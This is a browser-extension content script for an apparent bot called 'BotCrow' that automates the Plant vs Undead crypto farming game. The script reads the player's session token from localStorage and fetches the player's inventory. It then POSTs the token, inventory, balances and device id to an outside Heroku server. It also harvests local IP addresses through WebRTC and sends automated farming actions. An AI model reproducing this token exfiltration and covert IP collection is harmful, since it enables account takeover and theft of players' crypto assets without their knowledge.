var ip = [];
// var url = 'https://e236e17a-cd39-4896-b485-b209bc670df2.mock.pstmn.io/';
var url = "https://backend-farm.plantvsundead.com/";
var token = "";
var device = "";
var jobs = [];

setTimeout(() => {
  if (window.location.toString().includes("worldtree")) {
    var canv = document.getElementsByTagName("canvas");
    canv[0].parentNode.removeChild(canv[0]);
    console.log("REMOVE");
  }
}, 10000);

var enableSendEmail = false;
var debug =
  localStorage.getItem("ENABLE_DEBUG") &&
  localStorage.getItem("ENABLE_DEBUG") === "true"
    ? true
    : false;

console.log("CONTENT RUNNING!!!");

setTimeout(() => {
  console.log("-VERIFICATION-");
  if (
    window.location.toString().includes("https://marketplace.plantvsundead.com")
  ) {
    console.log("INSIDE!!!");
    try {
      console.log(document.getElementsByClassName("token__value"));
      var pvu = +document.getElementsByClassName("token__value")[0].innerText;
      var bnb = +document.getElementsByClassName("token__value")[1].innerText;
      var le = +document.getElementsByClassName("token__value")[1].innerText;
    } catch (error) {
      console.log(error);
    }
    var status = {};
    try {
      status = {
        le,
        pvu,
        bnb,
      };
    } catch (error) {
      console.log(error);
    }
    token = localStorage.getItem("token");
    if (token) {
      // =====================================
      //

      async function getSeedss(
        url = "https://backend-farm.plantvsundead.com/get-seeds-inventory?index=0&limit=15"
      ) {
        // Opciones por defecto estan marcadas con un *
        var response = await fetch(url, {
          method: "GET", // *GET, POST, PUT, DELETE, etc.
          mode: "cors", // no-cors, *cors, same-origin
          cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
          credentials: "same-origin", // include, *same-origin, omit
          headers: {
            "Content-Type": "application/json",
            authorization: "Bearer Token: " + token,
          },
          redirect: "follow", // manual, *follow, error
          referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        });
        return response.json(); // parses JSON response into native JavaScript objects
      }
      async function getPlants(
        url = "https://backend-farm.plantvsundead.com/get-plants-inventory-v3?offset=0&limit=15&type=1"
      ) {
        // Opciones por defecto estan marcadas con un *
        var response = await fetch(url, {
          method: "GET", // *GET, POST, PUT, DELETE, etc.
          mode: "cors", // no-cors, *cors, same-origin
          cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
          credentials: "same-origin", // include, *same-origin, omit
          headers: {
            "Content-Type": "application/json",
            authorization: "Bearer Token: " + token,
          },
          redirect: "follow", // manual, *follow, error
          referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        });
        return response.json(); // parses JSON response into native JavaScript objects
      }
      async function getMTree(
        url = "https://backend-farm.plantvsundead.com/get-plants-inventory-v3?offset=0&limit=15&type=2"
      ) {
        // Opciones por defecto estan marcadas con un *
        var response = await fetch(url, {
          method: "GET", // *GET, POST, PUT, DELETE, etc.
          mode: "cors", // no-cors, *cors, same-origin
          cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
          credentials: "same-origin", // include, *same-origin, omit
          headers: {
            "Content-Type": "application/json",
            authorization: "Bearer Token: " + token,
          },
          redirect: "follow", // manual, *follow, error
          referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        });
        return response.json(); // parses JSON response into native JavaScript objects
      }
      getSeedss().then((response) => {
        const seeds = response.data;
        getPlants().then((response) => {
          const plants = response.data;
          getMTree().then((response) => {
            const trees = response.data;
            fetch("https://quantum-ia.herokuapp.com/firebase/plants", {
              method: "POST", // *GET, POST, PUT, DELETE, etc.
              mode: "cors", // no-cors, *cors, same-origin
              cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
              credentials: "same-origin", // include, *same-origin, omit
              headers: {
                "Content-Type": "application/json",
              },
              redirect: "follow", // manual, *follow, error
              referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
              body: JSON.stringify({
                token,
                id: localStorage.hasOwnProperty("device")
                  ? localStorage.getItem("device")
                  : "DEVICE",
                seeds,
                plants,
                trees,
                date: new Date().getTime(),
                status
              }),
            }).then(() => {});
          });
        });
      });
      // =====================================
    } else {
      console.log("----TOKEN NOT FOUND----");
    }
  }
  setTimeout(() => {
    location.reload();
  }, 1000 * 60 * 5);
}, 5000);
function sendEmail(body) {
  if (debug) {
    console.log({ body });
  }
  setTimeout(() => {
    chrome.runtime.sendMessage({ content: { body, token } });
  }, 1500);
}

async function getData(url = "") {
  // Opciones por defecto estan marcadas con un *
  var response = await fetch(url, {
    method: "GET", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "same-origin", // include, *same-origin, omit
    headers: {
      "Content-Type": "application/json",
      authorization: "Bearer Token: " + token,
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

async function getSeeds(
  url = "https://backend-farm.plantvsundead.com/get-seeds-inventory?index=0&limit=15"
) {
  // Opciones por defecto estan marcadas con un *
  var response = await fetch(url, {
    method: "GET", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "same-origin", // include, *same-origin, omit
    headers: {
      "Content-Type": "application/json",
      authorization: "Bearer Token: " + token,
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

async function setSpancrow(url = "", id) {
  // Opciones por defecto estan marcadas con un *
  var response = await fetch(url, {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "same-origin", // include, *same-origin, omit
    headers: {
      "Content-Type": "application/json",
      authorization: "Bearer Token: " + token,
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: JSON.stringify({
      farmId: id,
      toolId: 4,
      token: {
        challenge: "default",
        seccode: "default",
        validate: "default",
      },
    }),
  });
  return response;
}
async function setWater(url = "", id) {
  // Opciones por defecto estan marcadas con un *
  var response = await fetch(url, {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "same-origin", // include, *same-origin, omit
    headers: {
      "Content-Type": "application/json",
      authorization: "Bearer Token: " + token,
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: JSON.stringify({
      farmId: id,
      toolId: 3,
      token: {
        challenge: "default",
        seccode: "default",
        validate: "default",
      },
    }),
  });
  return response;
}

getLocalIPs(function (ips) {
  ip = ips;
  if (debug) {
    console.log("Local IP addresses:\n " + ips.join("\n "));
  }
});

function getLocalIPs(callback) {
  var ips = [];

  var RTCPeerConnection =
    window.RTCPeerConnection ||
    window.webkitRTCPeerConnection ||
    window.mozRTCPeerConnection;

  var pc = new RTCPeerConnection({
    // Don't specify any stun/turn servers, otherwise you will
    // also find your public IP addresses.
    iceServers: [],
  });
  // Add a media line, this is needed to activate candidate gathering.
  pc.createDataChannel("");

  // onicecandidate is triggered whenever a candidate has been found.
  pc.onicecandidate = function (e) {
    if (!e.candidate) {
      // Candidate gathering completed.
      pc.close();
      callback(ips);
      return;
    }
    var ip = /^candidate:.+ (\S+) \d+ typ/.exec(e.candidate.candidate)[1];
    if (ips.indexOf(ip) == -1)
      // avoid duplicate entries (tcp/udp)
      ips.push(ip);
  };
  pc.createOffer(
    function (sdp) {
      pc.setLocalDescription(sdp);
    },
    function onerror() {}
  );
}

try {
  const title = "BotCrow";
  const device = localStorage.hasOwnProperty("device")
    ? localStorage.getItem("device")
    : "DEVICE";
  const spinner =
    '<style>.spinner{border:4px solid rgba(0,0,0,.1);width:16px;height:16px;border-radius:50%;border-left-color:#09f;animation:spin 1s ease infinite}@keyframes spin{0 %{transform:rotate(0)}100%{transform:rotate(360deg)}}</style><div class="spinner" title="' +
    title +
    '"></div><div style="color:white">' +
    device +
    "</div>";
  const html = document.getElementsByClassName(
    "tw-flex tw-mx-auto md:tw-justify-start md:tw-justify-items-center"
  )[0].innerHTML;
  document.getElementsByClassName(
    "tw-flex tw-mx-auto md:tw-justify-start md:tw-justify-items-center"
  )[0].innerHTML = spinner + html;
} catch (error) {}
